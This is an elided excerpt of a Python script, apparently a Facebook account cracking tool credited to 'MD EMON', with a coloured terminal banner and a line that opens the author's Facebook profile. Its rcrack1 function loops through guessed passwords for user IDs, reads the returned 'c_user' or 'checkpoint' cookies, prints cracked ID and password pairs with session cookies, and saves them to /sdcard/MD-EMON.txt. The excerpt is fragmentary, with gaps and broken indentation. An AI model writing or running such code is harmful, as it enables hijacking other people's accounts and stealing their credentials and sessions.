...
/_____/_/  /_/\____/_/ |_/ 
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD EMON
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD EMON
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD EMON
\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mMD EMON
\033[1;36m =[TOOLS ]=     \033[1;36m\033[1;36mMD EMON    \033[1;36m(V~0.1)
\033[1;36m═════════════════════════════════════════════════════════════
"""
linex=('\033[1;36m═════════════════════════════════════════════════════════════')
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://www.facebook.com/profile.php?id=61550800956633')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;36m=[%sMD-EMON\033[1;36m]=\033[1;34m∆\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m∆\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m=[MD-EMON💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/MD-EMON.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[MD-EMON💔]= {uid}|{ps}")
                open('/sdcard/MD-EMON.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
